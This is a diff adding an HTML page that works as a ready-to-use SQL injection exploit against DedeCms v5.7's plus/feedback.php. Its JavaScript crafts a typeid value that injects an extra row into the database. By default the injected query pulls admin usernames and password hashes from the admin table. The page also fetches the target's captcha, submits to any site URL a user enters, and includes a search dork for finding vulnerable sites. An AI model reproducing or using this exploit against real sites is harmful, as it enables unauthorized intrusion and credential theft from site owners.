@@ -1,0 +1,54 @@
+<html>
+<head>
+<title>DedeCms v5.7 feedback.php exp</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<script language='javascript'>
+y = document.form1.addr.value;
+function exploit()
+{	
+	var yanzhen = document.getElementById("yanzhen").value;
+	var aid = document.getElementById("aid").value;
+	var sqli = document.getElementById("sqli").value;
+	document.form1.typeid.value = "0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'), ('" + aid +"','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',"+sqli+")#";
+	document.form1.action = document.form1.addr.value + "/plus/feedback.php";
+	document.form1.te.name = "action";
+	document.form1.submit();
+}
+function getyanzhen()
+{
+	var x = "<img src='"+ document.form1.addr.value +"/include/vdimgck.php' width='60' height='24' onclick=\"this.src=this.src+'?'\">";
+	document.body.innerHTML+=x;
+	document.form1.addr.value = y;
+}
+function look()
+{
+	window.location.href = document.form1.addr.value+"/plus/feedback.php?aid="+document.getElementById("aid").value;
+}
+</script>
+</head>
+
+<body>
+############################################################<br/>
+DedeCms v5.7 feedback.php $typeid SQLi<br/>
+Time:2012-10-31<br/>
+Author:90sec-鬼哥 , 若相惜<br/>
+Dork:inurl:plus/feedback.php?aid=<br/>
+Analysis:http://www.wooyun.org/bugs/wooyun-2010-014076<br/>
+############################################################<br/><br/>
+<form action="xxx" method="get" name="form1" target="_blank">
+程序URL:<input type="text" id="addr" value="http://" /><br/>
+验证码:<input type="text" name="validate" id="yanzhen" value=""/><br/>
+存在的Aid:<input type="text" id="aid" value="1"/><br/>
+SQL注入语句:<input type="text" id="sqli" value="(SELECT concat(uname,0x5f,pwd,0x5f) FROM `#@__admin`)" style="width:500px;"/><br/>
+<input type="hidden" name="" id="te" value="send"/>
+<input type="hidden" name="comtype" value="comments"/>
+<input type="hidden" name="fid" value="1"/>
+<input type="hidden" name="isconfirm" value="yes"/>
+<input type="hidden" name="msg" value="90sec"/>
+<input type="hidden" name="typeid" value=""/>
+<input type="button" onclick="getyanzhen();" value="获取验证码">
+<input type="button" onClick="exploit()" value="#Exploit#" />
+<input type="button" onClick="look()" value="查看结果" /><br/>
+</form>
+</body>
+</html>
